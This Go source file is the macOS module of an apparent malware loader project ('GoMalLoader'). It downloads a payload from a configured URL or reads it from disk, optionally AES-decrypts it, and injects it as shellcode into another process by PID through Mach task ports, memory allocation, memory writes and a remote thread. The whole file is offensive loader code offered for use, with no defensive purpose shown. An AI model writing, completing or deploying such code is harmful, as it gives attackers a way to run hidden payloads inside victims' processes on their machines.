//go:build darwin

package loader

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"

	"GoMalLoader/utils"
)

// TODO: Implement remote injection using Mach APIs (task_for_pid, mach_vm_allocate, mach_vm_write, thread_create)

type darwinRemoteInjector struct{}

func NewRemoteInjector() RemoteInjector {
	return &darwinRemoteInjector{}
}

// Minimal: requires cfg.TargetProcess to be a PID string
func (l *darwinRemoteInjector) Inject(cfg LoaderConfig) error {
	if cfg.TargetProcess == "" {
		return fmt.Errorf("TargetProcess (PID as string) required in config for Mac remote injection")
	}
	pid, err := strconv.Atoi(cfg.TargetProcess)
	if err != nil {
		return fmt.Errorf("TargetProcess must be a PID (string): %v", err)
	}

	var payload []byte
	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}
	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	log.Printf("[+] Getting task port for PID %d", pid)
	task, err := utils.TaskForPID(pid)
	if err != nil {
		return fmt.Errorf("task_for_pid failed: %v", err)
	}

	log.Printf("[+] Allocating %d bytes in target process", len(payload))
	remoteAddr, err := utils.MachVMAllocate(task, len(payload))
	if err != nil {
		return fmt.Errorf("mach_vm_allocate failed: %v", err)
	}
	log.Printf("[+] Allocated memory at 0x%x", remoteAddr)

	log.Printf("[+] Writing shellcode to target process")
	if err := utils.MachVMWrite(task, remoteAddr, payload); err != nil {
		return fmt.Errorf("mach_vm_write failed: %v", err)
	}

	log.Printf("[+] Creating remote thread at 0x%x", remoteAddr)
	if err := utils.CreateRemoteThread(task, remoteAddr); err != nil {
		return fmt.Errorf("create remote thread failed: %v", err)
	}
	log.Printf("[+] Remote thread created and shellcode executed.")
	return nil
}
